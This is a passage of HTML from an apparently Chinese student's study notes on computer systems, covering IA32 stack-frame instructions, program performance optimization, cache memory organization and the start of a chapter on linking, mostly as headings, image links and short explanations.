title="IA32寄存器"></a>IA32寄存器</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184335897.png" alt="image-20210414184335897"></p><h4 id="算术操作"><a href="#算术操作" class="headerlink" title="算术操作"></a>算术操作</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184419105.png" alt="image-20210414184419105"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184428359.png" alt="image-20210414184428359"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414184615336.png" alt="image-20210414184615336"></p><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185557502.png" alt="image-20210414185557502"></p><h4 id="条件码设置"><a href="#条件码设置" class="headerlink" title="条件码设置"></a>条件码设置</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185743149.png" alt="image-20210414185743149"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185759630.png" alt="image-20210414185759630"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185811106.png" alt="image-20210414185811106"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210414185821323.png" alt="image-20210414185821323"></p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210416102006727.png" alt="image-20210416102006727"></p><blockquote><p><strong>call指令</strong></p></blockquote><ol><li><p>把下一条指令地址压栈b</p></li><li><p>再把调用的函数地址给eip</p></li></ol><blockquote><p><strong>leave指令</strong></p></blockquote><ol><li>movl %ebp %esp  将esp回到上一个过程的栈顶位置，即ebp的地址</li><li>popl %ebp              将旧的ebp地址返回ebp</li></ol><blockquote><p><strong>ret</strong></p></blockquote><p>pop %eip  将下一条指令地址给%eip</p><h3 id="复杂数据的机器级表示"><a href="#复杂数据的机器级表示" class="headerlink" title="复杂数据的机器级表示"></a>复杂数据的机器级表示</h3><h2 id="第五章-优化程序性能"><a href="#第五章-优化程序性能" class="headerlink" title="第五章 优化程序性能"></a>第五章 优化程序性能</h2><h3 id="编译器的局限"><a href="#编译器的局限" class="headerlink" title="编译器的局限"></a>编译器的局限</h3><ul><li><p>妨碍优化的因素</p><ol><li><p>存储器的别名使用</p><p><strong>存储器别名使用</strong>是指两个指针可能同时指向同一个存储器的位置的情况。在只考虑执行安全的优化中，编译器必须假设不同的指针可能会指向存储器的同一个位置，这造成了<strong>第一个妨碍优化的因素</strong>，这也是可能严重限制编译器产生优化代码机会的程序的一个方面。如果编译器不能确定指针的指向，它就会假设所有的情况都有可能，所以我们需要做的就是在<strong>编写程序的时候明确指针的指向</strong>。</p></li><li><p>函数调用</p><p><strong>函数调用</strong>是<strong>第二个妨碍优化的因素</strong>。尽可能减少函数的调用可以优化程序，但是编译器会假设最糟糕的情况，并<strong>保持所有的函数调用不变</strong>。所以，我们需要在<strong>编写程序的时候将函数调用的次数尽可能减少</strong>，这件事情只能coder来做，编译器为了安全是不会去做的。</p></li></ol></li></ul><h3 id="表示程序性能"><a href="#表示程序性能" class="headerlink" title="表示程序性能"></a>表示程序性能</h3><ul><li><p>用<strong>每元素的周期数</strong>（Cycles Per Element ，<strong>CPE</strong>）作为<strong>程序性能的度量标准</strong>。它的计算过程是：先得到函数的元素个数和周期的散点图，后经过<strong>最小二乘方拟合</strong>得到折线图，其中<strong>折线的斜率</strong>表明<strong>每元素的周期数CPE</strong>。</p></li><li><p><strong>运行时间：</strong>一个元素完成功能所运行的时间</p></li><li><p><strong>周期数每元素(Cycles Per Element, CPE )</strong> ：运行时间/时钟周期</p></li><li><p><strong>时间周期：</strong>CPU完成一个基本动作的时间（对应一个电平信号宽度）</p></li><li><p>一个时钟周期是多长时间呢？<br>通常当一个标有“4GHz”的处理器，表示处理器每秒运行4X10^9个时钟周期，一个时钟周<br>期的时长是时钟频率的倒数，为0.25X10^{-9}秒=0.25纳秒（250皮秒）<br>Hz， KHz， MHz, GHz<br>秒， 毫秒， 微秒，纳秒</p></li></ul><h3 id="不依赖于机器特性的优化"><a href="#不依赖于机器特性的优化" class="headerlink" title="不依赖于机器特性的优化"></a>不依赖于机器特性的优化</h3><h4 id="1-消除循环的低效率"><a href="#1-消除循环的低效率" class="headerlink" title="1. 消除循环的低效率"></a>1. 消除循环的低效率</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210608153952303.png" alt="image-20210608153952303"></p><p>这个优化是一类常见的优化的一个例子，称为<strong>代码移动( code motion</strong>)。这类优化包括识别要执行多次（例如在循环里）但是计算结果不会改变的计算。因而可以将计算移动到代码前面不会被多次求值的部分。</p><h4 id="2-减少过程调用"><a href="#2-减少过程调用" class="headerlink" title="2. 减少过程调用"></a>2. 减少过程调用</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609142759377.png" alt="image-20210609142759377"></p><h4 id="3-消除不必要的存储器引用"><a href="#3-消除不必要的存储器引用" class="headerlink" title="3. 消除不必要的存储器引用"></a>3. 消除不必要的存储器引用</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609143101235.png" alt="image-20210609143101235"></p><h3 id="理解现代处理器"><a href="#理解现代处理器" class="headerlink" title="理解现代处理器"></a>理解现代处理器</h3><h4 id="功能单元的性能"><a href="#功能单元的性能" class="headerlink" title="功能单元的性能"></a>功能单元的性能</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162108070.png" alt="image-20210609162108070"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162041644.png" alt="image-20210609162041644"></p><ul><li><strong>延迟</strong>：完成运算所需要的总时间</li><li><strong>发射时间</strong>：表示两个连续的同类型的运算之间所需要的最小时钟周期数</li><li><strong>最大吞吐量</strong>：发射时间的倒数</li><li><strong>廷迟界限</strong>：给出了任何必须按照严格顺序完成合并运算的函数所需要的最小CPE值。</li><li><strong>吞吐量界限</strong>：根据功能单元产生结果的最大速率，吞吐量界限给出了CPE的最小界限。</li></ul><h4 id="处理器操作的抽象模型"><a href="#处理器操作的抽象模型" class="headerlink" title="处理器操作的抽象模型"></a>处理器操作的抽象模型</h4><h5 id="1-从机器级代码到数据流图"><a href="#1-从机器级代码到数据流图" class="headerlink" title="1.从机器级代码到数据流图"></a>1.从机器级代码到数据流图</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162352543.png" alt="image-20210609162352543"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162425613.png" alt="image-20210609162425613"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609162517278.png" alt="image-20210609162517278"></p><p>图中的链是限制性能的关键路径</p><h5 id="2-其他性能因素"><a href="#2-其他性能因素" class="headerlink" title="2.其他性能因素"></a>2.其他性能因素</h5><ul><li>数据流表示的的<strong>关键路径</strong>提供的只是<strong>程序需要周期数的下界</strong>，还有其他一些因素会限制性能，包括<br><strong>可用的功能单元的数量</strong>和<strong>任何一步中功能单元之间能够传递数据值的数量</strong>。</li></ul><h3 id="基于机器特性的优化"><a href="#基于机器特性的优化" class="headerlink" title="基于机器特性的优化"></a>基于机器特性的优化</h3><h4 id="1-循环展开"><a href="#1-循环展开" class="headerlink" title="1.循环展开"></a>1.循环展开</h4><p><strong>循环展开</strong>是一种程序变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</p><p>循环展开能够从<strong>两个方面</strong>改程序的性能：</p><ul><li><p>首先，它减少了不直接有助于程序结果的操作的数量，例如循环索引计算和条件分支。</p></li><li><p>其次，它提供了ー些方法，可以进一步变化代码，减少整个计算中关键路径上的操作数量。在本节中，我们会看一些简单的循环展开，不做任何进一步的变化</p></li></ul><p>循环展开示例：<img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609163517926.png" alt="image-20210609163517926"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609163640228.png" alt="image-20210609163640228"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619165210954.png" alt="image-20210619165210954"></p><p>循环展开可以提高整数加法和乘法的性能，因为GCC会对整数乘法做重关联变换，但不会改变浮点加法和乘法做做这种变化，所以性能并没有提升</p><h4 id="2-提高并行性"><a href="#2-提高并行性" class="headerlink" title="2.提高并行性"></a>2.提高并行性</h4><h5 id="1-多个累计变量"><a href="#1-多个累计变量" class="headerlink" title="1) 多个累计变量"></a>1) 多个累计变量</h5><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164539108.png" alt="image-20210609164539108"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164604747.png" alt="image-20210609164604747"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619165230377.png" alt="image-20210619165230377"></p><h5 id="2-重新结合变换"><a href="#2-重新结合变换" class="headerlink" title="2) 重新结合变换"></a>2) 重新结合变换</h5><p>改变合并顺序：</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164646452.png" alt="image-20210609164646452"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164734377.png" alt="image-20210609164734377"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609164801356.png" alt="image-20210609164801356"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619165247136.png" alt="image-20210619165247136"></p><h3 id="一些限制因素"><a href="#一些限制因素" class="headerlink" title="一些限制因素"></a>一些限制因素</h3><ol><li>寄存器溢出</li><li>分支预测和预测错误处罚</li></ol><h3 id="理解存储器的性能"><a href="#理解存储器的性能" class="headerlink" title="理解存储器的性能"></a>理解存储器的性能</h3><h4 id="加载的性能"><a href="#加载的性能" class="headerlink" title="加载的性能"></a>加载的性能</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609171007080.png" alt="image-20210609171007080"></p><h4 id="存储的性能"><a href="#存储的性能" class="headerlink" title="存储的性能"></a>存储的性能</h4><h3 id="优化程序性能的基本策略"><a href="#优化程序性能的基本策略" class="headerlink" title="优化程序性能的基本策略"></a>优化程序性能的基本策略</h3><p><strong>1)高级设计</strong></p><p>为遇到的问题选择适当的算法和数据结构。要特别警觉，避免使用那些会渐进地产生糟糕性能的算法或编码技术。<br><strong>2)基本编码原则</strong></p><p>避免限制优化的因素，这样编译器就能产生高效的代码。</p><ul><li>消除连续的函数调用。在可能时，将计算移到循环外。考虑有选择地妥协程序的模块性以<br>获得更大的效率。</li><li>消除不必要的存储器引用。引人临时变量来保存中间结果。只有在最后的值计算出来时，<br>才将结果存放到数组或全局变量中。</li></ul><p><strong>3)低级优化</strong></p><ul><li>展开循环，降低开销，并且使得进一步的优化成为可能。</li><li>通过使用例如多个累积变量和重新结合等技术，找到方法提高指令级并行。</li><li>用功能的风格重写条件操作，使得编译采用条件数据传送。</li></ul><p><strong>Amdahl定律</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210609171724722.png" alt="image-20210609171724722"></p><h2 id="第六章-存储器体系结构"><a href="#第六章-存储器体系结构" class="headerlink" title="第六章 存储器体系结构"></a>第六章 存储器体系结构</h2><h3 id="6-1-存储技术"><a href="#6-1-存储技术" class="headerlink" title="6.1 存储技术"></a>6.1 存储技术</h3><h4 id="1-1-随机访问存储器"><a href="#1-1-随机访问存储器" class="headerlink" title="1.1 随机访问存储器"></a>1.1 随机访问存储器</h4><p>分为静态的(SRAM)和动态的(DRAM)</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614140955548.png" alt="image-20210614140955548"></p><p><strong>传统的DRAM</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141026087.png" alt="image-20210614141026087"></p><p><strong>存储器模块</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141219177.png" alt="image-20210614141219177"></p><h4 id="1-2-磁盘存储"><a href="#1-2-磁盘存储" class="headerlink" title="1.2 磁盘存储"></a>1.2 磁盘存储</h4><p>磁盘是广为应用的保存大量数据的存储设备，存储数据的数量级可以达到几百到几千千兆字节，而基于RAM的存储器只能有几百或几千兆字节。不过，从磁盘上读信息的时间为毫秒级，从DRAM读比从磁盘读快10万倍，从SRAM读比从磁盘读快100万倍。</p><p><strong>磁盘容量计算</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141419194.png" alt="image-20210614141419194"></p><p><strong>磁盘操作</strong></p><p>磁盘以扇区大小的块来读写数据。对扇区的访问时间有三个主要的部分：寻道时间、旋转时间、传送时间。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141748772.png" alt="image-20210614141748772"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614141816855.png" alt="image-20210614141816855"></p><p>因为寻道时间和旋转延迟大致是相等的，所以将寻道时间乘2是估计磁盘访问时间的简单而合理的办法。</p><h4 id="1-3-固态硬盘"><a href="#1-3-固态硬盘" class="headerlink" title="1.3 固态硬盘"></a>1.3 固态硬盘</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614162059129.png" alt="image-20210614162059129"></p><h3 id="6-2-局部性"><a href="#6-2-局部性" class="headerlink" title="6.2 局部性"></a>6.2 局部性</h3><h4 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h4><p>一个编写良好的计算机程序常常具有良好的局部性，它们倾向于引用邻近于其他最近引用过的数据项的数据项，或者最近引用过的数据项本身，这种倾向性，被称为局部性原理。</p><h4 id="量化评价局部性的简单原则"><a href="#量化评价局部性的简单原则" class="headerlink" title="量化评价局部性的简单原则"></a><strong>量化评价局部性的简单原则</strong></h4><ul><li>重复引用同一个变量的程序有良好的时间局部性。</li><li>对于具有步长为k的引用模式的程序，步长越小，空间局部性越好。具有步长为1的引用模式的程序有很好的空间局部性。在存储器中以大步长跳来跳去的程序空间局部性会很差。</li><li>对于取指令来说，循环有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</li></ul><h3 id="6-3-存储器层次结构"><a href="#6-3-存储器层次结构" class="headerlink" title="6.3 存储器层次结构"></a>6.3 存储器层次结构</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614144247180.png" alt="image-20210614144247180"></p><h4 id="存储器层次结构中的缓存"><a href="#存储器层次结构中的缓存" class="headerlink" title="存储器层次结构中的缓存"></a>存储器层次结构中的缓存</h4><p><strong>存储器层次结构的中心思想</strong></p><p>对于每个k,位于k层的更快更小的存储设备作为位于k+1层的更大更慢的存储设备的缓存。换句话说，层次结构中的每一层都缓存来自较低一层的数据对象。例如，本地磁盘作为通过网络从远程磁盘取出的文件(例如Web页面)的缓存，主存作为本地磁盘上数据的缓存，依此类推，直到最小的缓存CPU寄存器集合。</p><p><strong>缓存命中</strong></p><p>当程序需要第k+1层的某个数据对象d时，它首先在当前存储在第k层的一个块中査找d。如果d刚好缓存在第k层中，那么就是我们所说的<strong>缓存命中</strong>( cache hit)。</p><p><strong>缓存不命中</strong></p><p>另ー方面，如果第k层中没有缓存数据对象d,那么就是我们所说的<strong>缓存不命中</strong>（ cache miss).当发生缓存不命中时，第k层的缓存从第k+1层缓存中取出包含d的那个块，如果第k层的缓存已经满了的话，可能就会覆盖现存的一个块。</p><p>覆盖一个现存的块的过程称为<strong>替换</strong>( replacing)或<strong>驱逐</strong>( evicting)这个块。被驱逐的这个块有时也称为<strong>牺牲块</strong>( victim block)。决定该替换哪个块是由缓存的<strong>替换策略</strong>(replacement policy)来控制的。例如，一个具有随机替换策略的缓存会随机选择一个牺性块。一个具有最近最少被使用(LRU)替换策略的缓存会选择那个最后被访问的时间距现在最远的块。</p><p><strong>缓存不命中的种类</strong></p><ul><li><p>冷不命中</p><p>如果第k层的缓存是空的，那么对任何数据对象的访问都会不命中。一个空的缓存有时称为冷缓存( cold cache)，此类不命中称为<strong>强制性不命中</strong>或<strong>冷不命中</strong></p></li><li><p>冲突不命中</p><p>在这种情况下，缓存足够大，能够保存被引用的数据对象，但是因为这些对象会映射到同一个缓存块，缓存会一直不命中。</p><p>例如，如果程序请求块0,然后块8,然后块0,然后块8,依此类推，在第k层的缓存中，对这两个块的每次引用都会不命中，即使是这个缓存总共可以容纳4个块。</p></li><li><p>容量不命中</p><p>当工作集的大小超过缓存的大小时，缓存会经历<strong>容量不命中</strong>( capacity miss)。换句话说，缓存就是太小了，不能处理这个工作集。</p></li></ul><h3 id="6-4-高速缓存存储器"><a href="#6-4-高速缓存存储器" class="headerlink" title="6.4 高速缓存存储器"></a>6.4 高速缓存存储器</h3><h4 id="4-1-通用的高速缓存存储器结构"><a href="#4-1-通用的高速缓存存储器结构" class="headerlink" title="4.1 通用的高速缓存存储器结构"></a>4.1 通用的高速缓存存储器结构</h4><p>考虑一个计算机系统，其中每个存储器地址有m位，形成M=2^m^个不同的地址。如图6-27a所示。</p><p>这样一个机器的高速缓存被组织成一个有S=2^s^个<strong>高速缓存组</strong>的数组。</p><p>每个组包含E个<strong>高速缓存行</strong>( cache line)。</p><p>每个行是由一个B=2^b^字节的<strong>数据块</strong>( block)组成的，一个<br>有效位( valid bit)指明这个行是否包含有意义的信息，还有t=m-(b+s)个标记位(是当前块的存储器地址的位的一个子集），它们唯一地标识存储在这个高速缓存行中的块。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614150943188.png" alt="image-20210614150943188"></p><p><strong>高速缓存的大小</strong>：C=S×E×B</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152049400.png" alt="image-20210614152049400"></p><h4 id="4-2-直接映射高速缓存"><a href="#4-2-直接映射高速缓存" class="headerlink" title="4.2 直接映射高速缓存"></a>4.2 直接映射高速缓存</h4><p>根据E（每个组的高速缓存行数）高速缓存被分为不同的类。每个组只有一行(E=1)的高速缓存称为<strong>直接映射高速缓存</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152338888.png" alt="image-20210614152338888"></p><p><strong>1.直接映射高速缓存的组选择</strong></p><p>在这一步中，高速缓存从w的地址中间抽取出s个组索引位。这些位被解释成一个对应于个组号的无符号整数。换句话来说，如果我们把高速缓存看成是一个关于组的一维数组，那么这些组索引位就是一个到这个数组的索引。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152556380.png" alt="image-20210614152556380"></p><p><strong>2.直接映射高速缓存的行匹配</strong></p><p>当且仅当设置了有效位，而且高速缓存行中的标记与w的地址中的标记相匹配时，这一行中包含w的一个拷贝。</p><p><strong>3.直接映射高速缓存的字选择</strong></p><p>如图6-31所示，块偏移位提供了所需要的字的第一个字节的偏移。就像我们把高速缓存看成一个行的数组一样，我们把块看成一个字节的数组，而字节偏移是到这个数组的一个索引。在这个示例中，块偏移位是100<del>2</del>,它表明w的拷贝是从块中的字节4开始的（我们假设字长为4字节）。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614152831935.png" alt="image-20210614152831935"></p><p><strong>4.直接映射高速缓存中不命中时的行替换</strong></p><p>如果缓存不命中，那么它需要从存储器层次结构中的下一层取出被请求的块，然后将新的块存储在组索引位指示的组中的一个高速缓存行中。一般而言，如果组中都是有效高速缓存行了，那么必须要驱逐出一个现存的行。对于直接映射高速缓存来说，每个组只包含有一行，替换策略非常简单：<strong>用新取出的行替换当前的行</strong>。</p><ul><li>用中间位做索引高速缓存的使用效率更高。</li></ul><h4 id="4-3-组相连高速缓存"><a href="#4-3-组相连高速缓存" class="headerlink" title="4.3 组相连高速缓存"></a>4.3 组相连高速缓存</h4><p><strong>1.组相联高速缓存中的组选择</strong><br>它的组选择与直接映射高速缓存的组选择一样，组索引位标识组。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614160744314.png" alt="image-20210614160744314"></p><p><strong>2.组相联高速缓存中的行匹配和字选择</strong></p><p>图6-36展示了相联高速缓存中行匹配的基本思想。这里的一个重要思想就是组中的任何行都可以包含任何映射到这个组的存储器块。所以高速缓存必须<strong>捜索组中的每一行</strong>，寻找一个有效的行，其标记与地址中的标记相匹配。如果高速缓存找到了这样一行，那么我们就命中，块偏移从这个块中选择一个字，和前面一样。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614160949149.png" alt="image-20210614160949149"></p><p><strong>3.组相联高速缓存中不命中时的行替换</strong></p><p>有空行选择空行。</p><p>最简单的替换策略是<strong>随机选择要替换的</strong>行。</p><p><strong>最不常使用</strong>( Least-frequently-Used,LFU)策略会替换在<br>过去某个时间窗口内引用次数最少的那一行。</p><p><strong>最近最少使用</strong>( Least- Recently-Used,LRU)策略会替换最后一次访问时间最久远的那一行。所有这些策略都需要额外的时间和硬件。</p><h4 id="4-4-全相连高速缓存"><a href="#4-4-全相连高速缓存" class="headerlink" title="4.4 全相连高速缓存"></a>4.4 全相连高速缓存</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614161050792.png" alt="image-20210614161050792"></p><p><strong>1.全相联高速缓存中的组选择</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614161201608.png" alt="image-20210614161201608"></p><p><strong>2.全相联高速缓存中的行匹配和字选择</strong></p><p>全相联高速缓存中的行匹配和字选择与组相联高速缓存中的是一样的，如图6-39所示。它们之间的区别主要是个规模大小的问题。因为高速缓存电路必须并行地捜索许多相匹配的标记，造一个又大又快的相联高速缓存很困难，而且很昂贵。因此，全相联高速缓存只适合做小的高速缓存，例如虚拟存储器系统中的翻译备用缓冲器(TLB),它缓存页表项。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614161349454.png" alt="image-20210614161349454"></p><h4 id="4-5-有关写的问题"><a href="#4-5-有关写的问题" class="headerlink" title="4.5 有关写的问题"></a>4.5 有关写的问题</h4><p><strong>第一个问题：</strong>在高速缓存更新了它的w的拷贝之后，怎么更新w在层次结构中紧接着低一层中的拷贝？</p><ul><li><p><strong>直写</strong></p><p>就是立即将w的高速缓存块写回到紧接着的低一层中。虽然简单，但是直写的缺点是每次写都会引起总线流量。</p></li><li><p><strong>写回</strong></p><p>尽可能地推迟存储器更新，只有当替换算法要驱逐更新过的块时，才把它写到紧接着的低一层中。由于局部性，写回能显著地减少总线流量，但是它的缺点是增加了复杂性。高速缓存必须为每个高速缓存行维护一个额外的修改位( dirty bit),表明这个高速缓存块是否被修改过。</p></li></ul><p><strong>第二个问题：</strong>如何处理写不命中</p><ul><li><p><strong>写分配</strong></p><p>加载相应的低一层中的块到高速缓存中，然后更新这个高速缓存块。写分配试图利用写的空间局部性，但是缺点是每次不命中都会导致一个块从低一层传送到高速缓存。</p></li><li><p><strong>非写分配</strong></p><p>避开高速缓存，直接把这个字写到低一层中。</p></li></ul><p>直写高速缓存通常是非写分配的。写回高速缓存通常是写分配的。</p><h4 id="4-6一个真实的高速缓存层次结构的解剖"><a href="#4-6一个真实的高速缓存层次结构的解剖" class="headerlink" title="4.6一个真实的高速缓存层次结构的解剖"></a>4.6一个真实的高速缓存层次结构的解剖</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210614163042361.png" alt="image-20210614163042361"></p><h4 id="4-7-高速缓存参数的性能影响"><a href="#4-7-高速缓存参数的性能影响" class="headerlink" title="4.7 高速缓存参数的性能影响"></a>4.7 <strong>高速缓存参数的性能影响</strong></h4><p><strong>衡量高速缓存的性能指标</strong></p><ul><li><p><strong>不命中率</strong></p><p>不命中数量/引用数量</p></li><li><p><strong>命中率</strong></p><p>命中率=1-不命中率</p></li><li><p><strong>命中时间</strong></p><p>从高速缓存传送一个字到CPU所需的时间，包括组选择、行确认和字选择的时间。</p></li><li><p><strong>不命中处罚</strong></p><p>由于不命中所需要的额外的时间。</p></li></ul><p><strong>1.高速缓存大小的影响</strong></p><p><strong>2.块大小的影响</strong></p><p><strong>3.相联度的影响</strong></p><p><strong>4.写策略的影响</strong></p><h2 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h2><h3 id="7-1-编译器驱动程序"><a href="#7-1-编译器驱动程序" class="headerlink" title="7.1 编译器驱动程序"></a>7.1 编译器驱动程序</h3><p>大多数编译系统提供<strong>编译驱动桯序</strong>( compiler driver),它代表用户在需要时调用语言预处理器、编译器、汇编器和链接器。</p><hr><h3 id="7-2-静态链接"><a href="#7-2-静态链接" class="headerlink" title="7.2 静态链接"></a>7.2 静态链接</h3><p>像Unix ld程序这样的<strong>静态链接器</strong>以一组可重定位目标文件和命令行参数作为输人，生成一个完全链接的可以加载和运行的可执行目标文件作为输出。</p><p>输入的<strong>可重定位目标文件</strong>由各种不同的代码和数据节(section)组成。指令在一个节中，初始化的全局变量在另一个节中，而未初始化的变量又在另外一个节中。</p><p><strong>链接器主要任务：</strong></p><ul><li><strong>符号解析</strong>( symbol resolution)。目标文件定义和引用符号。符号解析的目的是将每个符号<br>引用刚好和一个符号定义联系起来。</li><li><strong>重定位</strong>( relocation)。编译器和汇编器生成从地址0开始的代码和数据节。链接器通过把<br>每个符号定义与一个存储器位置联系起来，然后修改所有对这些符号的引用，使得它们指<br>向这个存储器位置，从而重定位这些节。</li></ul><hr><h3 id="7-3-目标文件"><a href="#7-3-目标文件" class="headerlink" title="7.3 目标文件"></a>7.3 